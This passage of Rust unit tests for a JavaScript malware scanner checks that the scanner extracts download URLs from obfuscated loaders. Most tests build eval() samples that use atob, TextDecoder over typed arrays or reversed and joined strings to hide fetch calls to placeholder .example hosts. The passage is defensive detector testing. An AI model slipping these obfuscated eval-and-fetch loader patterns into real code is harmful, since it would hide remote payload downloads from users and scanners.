    fn js_window_bracket_textdecoder_uint8array_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let payload = "fetch('https://window-bracket-textdecoder-js.example/p')";
        let bytes = payload
            .as_bytes()
            .iter()
            .map(u8::to_string)
            .collect::<Vec<_>>()
            .join(",");
        let js = format!(r#"eval(new window["TextDecoder"]().decode(new Uint8Array([{bytes}])))"#)
            .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://window-bracket-textdecoder-js.example/p"
            )
        });
        assert!(
            has,
            "JS window[\"TextDecoder\"] Uint8Array payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_textdecoder_non_utf8_encoding_arg_does_not_decode_ascii_bytes() {
        let mut env = Environment::new(&Config::default());
        let payload = "fetch('https://textdecoder-non-utf8-js.example/p')";
        let bytes = payload
            .as_bytes()
            .iter()
            .map(u8::to_string)
            .collect::<Vec<_>>()
            .join(",");
        let js = format!(r#"eval(new TextDecoder("utf-16le").decode(new Uint8Array([{bytes}])))"#)
            .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://textdecoder-non-utf8-js.example/p"
            )
        });
        assert!(
            !has,
            "JS TextDecoder non-UTF-8 bytes were decoded as UTF-8: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_textdecoder_utf16le_uint8array_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let payload = "fetch('https://textdecoder-utf16le-js.example/p')";
        let bytes = payload
            .encode_utf16()
            .flat_map(u16::to_le_bytes)
            .map(|byte| byte.to_string())
            .collect::<Vec<_>>()
            .join(",");
        let js = format!(r#"eval(new TextDecoder("utf-16le").decode(new Uint8Array([{bytes}])))"#)
            .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://textdecoder-utf16le-js.example/p"
            )
        });
        assert!(
            has,
            "JS TextDecoder UTF-16LE Uint8Array payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_textdecoder_utf16le_buffer_from_hex_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let payload = "fetch('https://textdecoder-utf16le-buffer-hex-js.example/p')";
        let encoded = payload
            .encode_utf16()
            .flat_map(u16::to_le_bytes)
            .map(|byte| format!("{byte:02x}"))
            .collect::<String>();
        let js =
            format!(r#"eval(new TextDecoder("utf-16le").decode(Buffer.from("{encoded}", "hex")))"#)
                .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://textdecoder-utf16le-buffer-hex-js.example/p"
            )
        });
        assert!(
            has,
            "JS TextDecoder UTF-16LE Buffer.from(hex) payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_textdecoder_bound_utf16le_buffer_from_hex_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let payload = "fetch('https://textdecoder-bound-utf16le-buffer-hex-js.example/p')";
        let encoded = payload
            .encode_utf16()
            .flat_map(u16::to_le_bytes)
            .map(|byte| format!("{byte:02x}"))
            .collect::<String>();
        let js = format!(
            r#"var b = Buffer.from("{encoded}", "hex"); eval(new TextDecoder("utf-16le").decode(b))"#
        )
        .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://textdecoder-bound-utf16le-buffer-hex-js.example/p"
            )
        });
        assert!(
            has,
            "JS TextDecoder bound UTF-16LE Buffer.from(hex) payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_textdecoder_bound_uint8array_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let payload = "fetch('https://textdecoder-bound-uint8array-js.example/p')";
        let bytes = payload
            .as_bytes()
            .iter()
            .map(u8::to_string)
            .collect::<Vec<_>>()
            .join(",");
        let js = format!(r#"var a = new Uint8Array([{bytes}]); eval(new TextDecoder().decode(a))"#)
            .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://textdecoder-bound-uint8array-js.example/p"
            )
        });
        assert!(
            has,
            "JS TextDecoder bound Uint8Array payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_textdecoder_bound_utf16le_uint8array_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let payload = "fetch('https://textdecoder-bound-utf16le-js.example/p')";
        let bytes = payload
            .encode_utf16()
            .flat_map(u16::to_le_bytes)
            .map(|byte| byte.to_string())
            .collect::<Vec<_>>()
            .join(",");
        let js = format!(
            r#"var a = new Uint8Array([{bytes}]); eval(new TextDecoder("utf-16le").decode(a))"#
        )
        .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://textdecoder-bound-utf16le-js.example/p"
            )
        });
        assert!(
            has,
            "JS TextDecoder bound UTF-16LE Uint8Array payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_textdecoder_bound_int8array_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let payload = "fetch('https://textdecoder-bound-int8array-js.example/p')";
        let bytes = payload
            .as_bytes()
            .iter()
            .map(u8::to_string)
            .collect::<Vec<_>>()
            .join(",");
        let js = format!(r#"var a = new Int8Array([{bytes}]); eval(new TextDecoder().decode(a))"#)
            .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://textdecoder-bound-int8array-js.example/p"
            )
        });
        assert!(
            has,
            "JS TextDecoder bound Int8Array payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_textdecoder_bound_int8array_of_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let payload = "fetch('https://textdecoder-bound-int8array-of-js.example/p')";
        let bytes = payload
            .as_bytes()
            .iter()
            .map(u8::to_string)
            .collect::<Vec<_>>()
            .join(",");
        let js = format!(r#"var a = Int8Array.of({bytes}); eval(new TextDecoder().decode(a))"#)
            .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://textdecoder-bound-int8array-of-js.example/p"
            )
        });
        assert!(
            has,
            "JS TextDecoder bound Int8Array.of payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_textdecoder_bound_int8array_from_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let payload = "fetch('https://textdecoder-bound-int8array-from-js.example/p')";
        let bytes = payload
            .as_bytes()
            .iter()
            .map(u8::to_string)
            .collect::<Vec<_>>()
            .join(",");
        let js = format!(r#"var a = Int8Array.from([{bytes}]); eval(new TextDecoder().decode(a))"#)
            .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://textdecoder-bound-int8array-from-js.example/p"
            )
        });
        assert!(
            has,
            "JS TextDecoder bound Int8Array.from payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_textdecoder_bound_uint8clampedarray_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let payload = "fetch('https://textdecoder-bound-uint8clampedarray-js.example/p')";
        let bytes = payload
            .as_bytes()
            .iter()
            .map(u8::to_string)
            .collect::<Vec<_>>()
            .join(",");
        let js = format!(
            r#"var a = new Uint8ClampedArray([{bytes}]); eval(new TextDecoder().decode(a))"#
        )
        .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://textdecoder-bound-uint8clampedarray-js.example/p"
            )
        });
        assert!(
            has,
            "JS TextDecoder bound Uint8ClampedArray payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_textdecoder_bound_uint8clampedarray_of_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let payload = "fetch('https://textdecoder-bound-uint8clampedarray-of-js.example/p')";
        let bytes = payload
            .as_bytes()
            .iter()
            .map(u8::to_string)
            .collect::<Vec<_>>()
            .join(",");
        let js =
            format!(r#"var a = Uint8ClampedArray.of({bytes}); eval(new TextDecoder().decode(a))"#)
                .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://textdecoder-bound-uint8clampedarray-of-js.example/p"
            )
        });
        assert!(
            has,
            "JS TextDecoder bound Uint8ClampedArray.of payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_textdecoder_bound_uint8clampedarray_from_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let payload = "fetch('https://textdecoder-bound-uint8clampedarray-from-js.example/p')";
        let bytes = payload
            .as_bytes()
            .iter()
            .map(u8::to_string)
            .collect::<Vec<_>>()
            .join(",");
        let js = format!(
            r#"var a = Uint8ClampedArray.from([{bytes}]); eval(new TextDecoder().decode(a))"#
        )
        .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://textdecoder-bound-uint8clampedarray-from-js.example/p"
            )
        });
        assert!(
            has,
            "JS TextDecoder bound Uint8ClampedArray.from payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_atob_regex_whitespace_replace_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://atob-regex-whitespace-js.example/p')",
        );
        let noisy = encoded
            .chars()
            .map(|ch| format!("{ch} "))
            .collect::<String>();
        let js = format!(r#"var b = "{noisy}"; eval(atob(b.replace(/\s/g, "")))"#).into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://atob-regex-whitespace-js.example/p"
            )
        });
        assert!(
            has,
            "JS atob regex whitespace replace payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_atob_regex_whitespace_class_replace_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://atob-regex-whitespace-class-js.example/p')",
        );
        let noisy = encoded
            .chars()
            .enumerate()
            .map(|(idx, ch)| match idx % 3 {
                0 => format!("{ch}\\t"),
                1 => format!("{ch}\\r\\n"),
                _ => format!("{ch} "),
            })
            .collect::<String>();
        let js =
            format!(r#"var b = "{noisy}"; eval(atob(b.replace(/[ \t\r\n]/g, "")))"#).into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://atob-regex-whitespace-class-js.example/p"
            )
        });
        assert!(
            has,
            "JS atob regex whitespace class replace payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_atob_call_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://atob-call-js.example/p')",
        );
        let js = format!(r#"eval(atob.call(null, "{encoded}"))"#).into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://atob-call-js.example/p"
            )
        });
        assert!(has, "JS atob.call payload URL missed: {:?}", env.traits);
    }

    #[test]
    fn js_atob_apply_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://atob-apply-js.example/p')",
        );
        let js = format!(r#"eval(atob.apply(null, ["{encoded}"]))"#).into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://atob-apply-js.example/p"
            )
        });
        assert!(has, "JS atob.apply payload URL missed: {:?}", env.traits);
    }

    #[test]
    fn js_atob_apply_inline_array_slice_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://atob-apply-inline-array-slice-js.example/p')",
        );
        let js = format!(r#"eval(atob.apply(null, ["noise", "{encoded}", "noise"].slice(1, 2)))"#)
            .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://atob-apply-inline-array-slice-js.example/p"
            )
        });
        assert!(
            has,
            "JS atob.apply inline array slice payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_atob_apply_array_variable_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://atob-apply-array-var-js.example/p')",
        );
        let js = format!(r#"var a = ["{encoded}"]; eval(atob.apply(null, a))"#).into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://atob-apply-array-var-js.example/p"
            )
        });
        assert!(
            has,
            "JS atob.apply array variable payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_atob_apply_array_slice_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://atob-apply-array-slice-js.example/p')",
        );
        let js = format!(
            r#"var a = ["noise", "{encoded}", "noise"]; eval(atob.apply(null, a.slice(1, 2)))"#
        )
        .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://atob-apply-array-slice-js.example/p"
            )
        });
        assert!(
            has,
            "JS atob.apply array slice payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_atob_apply_bound_array_variable_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://atob-apply-bound-array-js.example/p')",
        );
        let js =
            format!(r#"var e = "{encoded}"; var a = [e]; eval(atob.apply(null, a))"#).into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://atob-apply-bound-array-js.example/p"
            )
        });
        assert!(
            has,
            "JS atob.apply bound array variable payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_atob_function_alias_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://atob-alias-js.example/p')",
        );
        let js = format!(r#"var d = window.atob; eval(d("{encoded}"))"#).into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://atob-alias-js.example/p"
            )
        });
        assert!(
            has,
            "JS atob function alias payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_atob_dynamic_member_function_alias_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://atob-dynamic-member-alias-js.example/p')",
        );
        let js =
            format!(r#"var k = "at" + "ob"; var d = window[k]; eval(d("{encoded}"))"#).into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://atob-dynamic-member-alias-js.example/p"
            )
        });
        assert!(
            has,
            "JS atob dynamic member function alias payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_atob_member_property_alias_not_decoded() {
        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://atob-property-alias-js.example/p')",
        );
        let js = format!(r#"var d = window.atob.toString; eval(d("{encoded}"))"#).into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://atob-property-alias-js.example/p"
            )
        });
        assert!(
            !has,
            "JS atob member property alias was decoded as a payload: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_atob_array_index_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://atob-array-index-js.example/p')",
        );
        let js = format!(r#"var a = ["{encoded}"]; eval(atob(a[0]))"#).into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://atob-array-index-js.example/p"
            )
        });
        assert!(
            has,
            "JS atob array index payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_atob_assigned_array_index_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://atob-assigned-array-index-js.example/p')",
        );
        let js = format!(r#"var a = ["{encoded}"]; var b = a[0]; eval(atob(b))"#).into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://atob-assigned-array-index-js.example/p"
            )
        });
        assert!(
            has,
            "JS atob assigned array index payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_atob_array_shift_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://atob-array-shift-js.example/p')",
        );
        let js = format!(r#"var a = ["{encoded}", "noise"]; eval(atob(a.shift()))"#).into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://atob-array-shift-js.example/p"
            )
        });
        assert!(
            has,
            "JS atob array shift payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_atob_assigned_array_shift_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://atob-assigned-array-shift-js.example/p')",
        );
        let js = format!(r#"var a = ["{encoded}", "noise"]; var b = a.shift(); eval(atob(b))"#)
            .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://atob-assigned-array-shift-js.example/p"
            )
        });
        assert!(
            has,
            "JS atob assigned array shift payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_atob_array_join_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://atob-array-join-js.example/p')",
        );
        let split = encoded.len() / 2;
        let (left, right) = encoded.split_at(split);
        let js = format!(r#"var a = ["{left}", "{right}"]; eval(atob(a.join("")))"#).into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://atob-array-join-js.example/p"
            )
        });
        assert!(
            has,
            "JS atob array join payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_atob_array_slice_join_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://atob-array-slice-join-js.example/p')",
        );
        let split = encoded.len() / 2;
        let (left, right) = encoded.split_at(split);
        let js =
            format!(r#"var a = ["noise", "{left}", "{right}"]; eval(atob(a.slice(1).join("")))"#)
                .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://atob-array-slice-join-js.example/p"
            )
        });
        assert!(
            has,
            "JS atob array slice/join payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_atob_array_reverse_slice_join_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://atob-array-reverse-slice-join-js.example/p')",
        );
        let split = encoded.len() / 2;
        let (left, right) = encoded.split_at(split);
        let js = format!(
            r#"var a = ["noise", "{right}", "{left}"]; eval(atob(a.reverse().slice(0, 2).join("")))"#
        )
        .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://atob-array-reverse-slice-join-js.example/p"
            )
        });
        assert!(
            has,
            "JS atob array reverse/slice/join payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_atob_concat_arg_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://atob-concat-arg-js.example/p')",
        );
        let split = encoded.len() / 2;
        let (left, right) = encoded.split_at(split);
        let js = format!(r#"var p = "{left}"; var q = "{right}"; eval(atob(p + q))"#).into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://atob-concat-arg-js.example/p"
            )
        });
        assert!(
            has,
            "JS atob concat arg payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_atob_variable_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://atob-var-js.example/p')",
        );
        let js = format!(r#"var b = "{encoded}"; var u = atob(b); eval(u)"#).into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://atob-var-js.example/p"
            )
        });
        assert!(has, "JS atob variable payload URL missed: {:?}", env.traits);
    }

    #[test]
    fn js_window_atob_variable_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://window-atob-var-js.example/p')",
        );
        let js = format!(r#"var b = "{encoded}"; var u = window.atob(b); eval(u)"#).into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://window-atob-var-js.example/p"
            )
        });
        assert!(
            has,
            "JS window.atob variable payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_variable_member_atob_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://member-atob-var-js.example/p')",
        );
        let js =
            format!(r#"var f = "a" + "tob"; var b = "{encoded}"; var u = window[f](b); eval(u)"#)
                .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://member-atob-var-js.example/p"
            )
        });
        assert!(
            has,
            "JS variable member atob payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_direct_variable_member_atob_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://direct-member-atob-var-js.example/p')",
        );
        let js = format!(r#"var f = "a" + "tob"; eval(window[f]("{encoded}"))"#).into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://direct-member-atob-var-js.example/p"
            )
        });
        assert!(
            has,
            "JS direct variable member atob payload URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_atob_unpadded_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://atob-unpadded-js.example/p')",
        )
        .trim_end_matches('=')
        .to_string();
        let js = format!(r#"eval(atob("{encoded}"))"#).into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://atob-unpadded-js.example/p"
            )
        });
        assert!(has, "JS unpadded atob URL missed: {:?}", env.traits);
    }

    #[test]
    fn js_split_reverse_join_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let js =
            br#"var u = "egats/elpmaxe.esrever-sj//:sptth".split('').reverse().join(''); eval(u)"#
                .to_vec();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://js-reverse.example/stage"
            )
        });
        assert!(has, "JS split/reverse/join URL missed: {:?}", env.traits);
    }

    #[test]
    fn js_array_from_reverse_join_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let js =
            br#"var u = Array.from("egats/elpmaxe.morf-yarra-sj//:sptth").reverse().join(""); eval(u)"#
                .to_vec();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://js-array-from.example/stage"
            )
        });
        assert!(
            has,
            "JS Array.from reverse/join URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_array_join_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let js =
            br#"var u = ["https://", "js-array.example", "/stage"].join(""); eval(u)"#.to_vec();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://js-array.example/stage"
            )
        });
        assert!(has, "JS array join URL missed: {:?}", env.traits);
    }

    #[test]
    fn js_array_constructor_join_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let js =
            br#"var u = Array("https://", "js-array-ctor.example", "/stage").join(""); eval(u)"#
                .to_vec();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://js-array-ctor.example/stage"
            )
        });
        assert!(has, "JS Array(...) join URL missed: {:?}", env.traits);
    }

    #[test]
    fn js_array_reverse_join_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let js =
            br#"var u = ["/stage", "js-array-rev.example", "https://"].reverse().join(""); eval(u)"#
                .to_vec();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://js-array-rev.example/stage"
            )
        });
        assert!(has, "JS array reverse/join URL missed: {:?}", env.traits);
    }

    #[test]
    fn js_array_constructor_reverse_join_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let js =
            br#"var u = Array("/stage", "js-array-ctor-rev.example", "https://").reverse().join(""); eval(u)"#
                .to_vec();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://js-array-ctor-rev.example/stage"
            )
        });
        assert!(
            has,
            "JS Array(...) reverse/join URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_array_variable_join_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let js =
            br#"var parts = ["https://", "js-array-var.example", "/stage"]; var u = parts.join(""); eval(u)"#
                .to_vec();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://js-array-var.example/stage"
            )
        });
        assert!(has, "JS array variable join URL missed: {:?}", env.traits);
    }

    #[test]
    fn js_array_variable_reverse_join_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let js =
